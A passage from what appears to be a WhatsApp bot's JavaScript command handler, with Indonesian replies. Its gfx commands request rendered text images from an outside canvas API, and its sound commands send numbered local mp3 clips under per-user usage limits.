                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: fatih }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'gfx1':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 5) return reply(`Teksnya kebanyakan`)
                addCountCmd('#gfx1', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var fatih = `https://fatiharridho.herokuapp.com/api/canvas/gfx1?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: fatih }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'gfx2':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 5) return reply(`Teksnya kebanyakan`)
                addCountCmd('#gfx2', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var fatih = `https://fatiharridho.herokuapp.com/api/canvas/gfx2?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: fatih }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'gfx3':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 5) return reply(`Teksnya kebanyakan`)
                addCountCmd('#gfx3', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var fatih = `https://fatiharridho.herokuapp.com/api/canvas/gfx3?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: fatih }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'gfx4':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 5) return reply(`Teksnya kebanyakan`)
                addCountCmd('#gfx4', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var fatih = `https://fatiharridho.herokuapp.com/api/canvas/gfx4?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: fatih }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'gfx5':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Riy 04`)
                if (q.length > 5) return reply(`Teksnya kebanyakan`)
                addCountCmd('#gfx5', sender, _cmd)
                reply("_Wait a minute, data is being processed!_")
                var fatih = `https://fatiharridho.herokuapp.com/api/canvas/gfx5?text=${q}`
                conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: fatih }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'custom-gfx-1':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim atau balas Sticker/Foto dengan caption ${command} Riy 04`)
                   if (q.length > 5) return reply(`Teksnya kebanyakan`)
                   var media = null
                   if (isQuotedSticker) {
                     var fileName = 'sticker'+makeid(10)+'.webp'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${fileName}`)
                   } else if (isImage || isQuotedImage) {
                     var fileName = 'image'+makeid(10)+'.jpg'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${fileName}`)
                   }
                   if (media !== null) {
                     reply("_Wait a minute, data is being processed!_")
                     addCountCmd('#custom-gfx-1', sender, _cmd)
                     var { name, url, size } = await UploadFileUgu(media)
                     size = bytesToSize(size)
                     var riy = `https://fatiharridho.herokuapp.com/api/canvas/customgfx1?text=${q}&bg=${url}`
                     conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                     limitAdd(sender, limit)
                     fs.unlinkSync(media)
                   } else {
                     reply("Maaf terjadi kesalahan")
                     fs.unlinkSync(media)
                   }
                   break
            case prefix+'custom-gfx-2':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim atau balas Sticker/Foto dengan caption ${command} Riy|04`)
                   if (!q.includes('|')) return reply(`Format salah, contoh pemakaian ${command} Riy|04`)
                   var tek1 = q.split('|')[0]
                   var tek2 = q.split('|')[1]
                   if (!tek2) return reply(`Format salah, contoh pemakaian ${command} Riy|04`)
                   if (tek1.length > 5) return reply(`Teks 1 kepanjangan`)
                   if (tek2.length > 5) return reply(`Teks 2 kepanjangan`)
                   var media = null
                   if (isQuotedSticker) {
                     var fileName = 'sticker'+makeid(10)+'.webp'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${fileName}`)
                   } else if (isImage || isQuotedImage) {
                     var fileName = 'image'+makeid(10)+'.jpg'
                     var media = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${fileName}`)
                   }
                   if (media !== null) {
                     reply("_Wait a minute, data is being processed!_")
                     addCountCmd('#custom-gfx-2', sender, _cmd)
                     var { name, url, size } = await UploadFileUgu(media)
                     size = bytesToSize(size)
                     var riy = `https://fatiharridho.herokuapp.com/api/canvas/customgfx2?text1=${tek1}&text2=${tek2}&bg=${url}`
                     conn.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                     limitAdd(sender, limit)
                     fs.unlinkSync(media)
                   } else {
                     reply("Maaf terjadi kesalahan")
                     fs.unlinkSync(media)
                   }
                   break
            // Sound Menu
            case prefix+'sound1':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound1', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound1.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound2':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound2', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound2.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound3':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound3', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound3.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound4':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound4', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound1.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound5':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound5', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound5.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound6':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound6', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound6.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound7':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound7', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound7.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound8':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound8', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound8.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound9':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound9', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound9.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound10':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound10', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound10.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound11':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound11', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound11.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound12':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound12', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound12.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound13':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound13', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound13.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound14':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound14', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound14.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound15':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound14', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound14.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound16':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound16', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound16.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound17':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound17', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound17.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound18':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound18', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound18.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound19':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound19', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound19.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound20':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound20', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound20.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound21':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound21', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound21.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound22':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound22', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound22.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound23':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound23', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound23.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound24':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound24', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound24.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound25':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound25', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound25.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound26':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound26', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound26.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound27':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound27', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound27.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound28':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound28', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound28.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound29':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound29', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound29.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound30':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound30', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound30.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound31':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound31', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound31.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound32':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound32', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound32.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound33':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound33', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound33.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound34':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound34', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound34.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound35':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound35', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound35.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound36':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound36', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound36.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound37':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound37', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound37.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound38':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound38', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound38.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound39':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound39', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound39.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound40':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound40', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound40.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound41':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound41', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound41.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound42':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound42', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound42.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound43':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound43', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound43.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound44':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound44', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound44.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound45':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound45', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound45.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound46':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound46', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound46.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound47':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound47', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound47.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound48':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound48', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound48.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound49':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound49', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound49.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound50':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound50', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound50.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound51':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound51', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound51.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound52':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound52', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound52.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound53':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound53', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound53.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound54':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound54', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound54.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound55':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound55', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound55.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound56':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound56', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound56.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound57':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound57', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound57.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound58':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound58', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound58.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound59':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound59', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound59.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound60':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound60', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound60.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound61':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound61', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound61.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound62':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound62', sender, _cmd)
                conn.sendMessage(from, { audio: { url: './lib/sound/sound62.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound63':
